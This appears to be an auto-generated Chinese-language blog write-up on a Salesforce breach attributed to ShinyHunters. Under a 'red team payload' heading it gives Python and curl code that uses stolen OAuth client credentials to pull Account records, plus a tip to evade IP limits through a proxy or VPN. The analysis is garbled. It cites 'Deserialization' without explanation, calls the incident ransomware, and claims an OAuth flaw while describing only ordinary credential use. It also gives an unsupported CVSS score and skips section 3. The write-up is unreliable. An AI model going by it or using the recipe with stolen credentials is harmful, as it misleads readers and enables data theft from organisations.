# 🔥 解析 Salesforce 資料外洩事件：ShinyHunters 勒索軟體攻擊技術分析
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: `Salesforce API`, `OAuth 2.0`, `Deserialization`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Salesforce API 的 OAuth 2.0 驗證機制存在漏洞，允許攻擊者使用未經授權的存取權限。
* **攻擊流程圖解**: 
  1. 攻擊者獲得 Salesforce API 的 Client ID 和 Client Secret。
  2. 攻擊者使用 Client ID 和 Client Secret 進行 OAuth 2.0 驗證。
  3. Salesforce API 返回存取權限 Token。
  4. 攻擊者使用存取權限 Token 存取 Salesforce 資料。
* **受影響元件**: Salesforce API (版本號：未公開)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: Salesforce API 的 Client ID 和 Client Secret。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # Salesforce API 的 Client ID 和 Client Secret
    client_id = "YOUR_CLIENT_ID"
    client_secret = "YOUR_CLIENT_SECRET"
    
    # OAuth 2.0 驗證
    auth_url = "https://login.salesforce.com/services/oauth2/token"
    auth_data = {
        "grant_type": "client_credentials",
        "client_id": client_id,
        "client_secret": client_secret
    }
    auth_response = requests.post(auth_url, data=auth_data)
    
    # 獲取存取權限 Token
    access_token = auth_response.json()["access_token"]
    
    # 存取 Salesforce 資料
    data_url = "https://your-instance.my.salesforce.com/services/data/v52.0/query/"
    data_params = {
        "q": "SELECT Id, Name FROM Account"
    }
    data_headers = {
        "Authorization": f"Bearer {access_token}"
    }
    data_response = requests.get(data_url, params=data_params, headers=data_headers)
    
    print(data_response.json())
    
    ```
    *範例指令*: 使用 `curl` 命令進行 OAuth 2.0 驗證和存取 Salesforce 資料。

```

bash
curl -X POST \
  https://login.salesforce.com/services/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'grant_type=client_credentials&client_id=YOUR_CLIENT_ID&client_secret=YOUR_CLIENT_SECRET'

curl -X GET \
  https://your-instance.my.salesforce.com/services/data/v52.0/query/ \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -d 'q=SELECT Id, Name FROM Account'

```
* **繞過技術**: 使用代理伺服器或 VPN 來繞過 IP 限制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **OAuth 2.0**: OAuth 2.0 是一個授權框架，允許應用程式存取使用者的資源而不需要使用者的密碼。
* **Deserialization**: Deserialization 是指將序列化的資料轉換回原始的資料結構。
* **Salesforce API**: Salesforce API 是 Salesforce 平台的應用程式介面，允許開發人員存取和操作 Salesforce 資料。
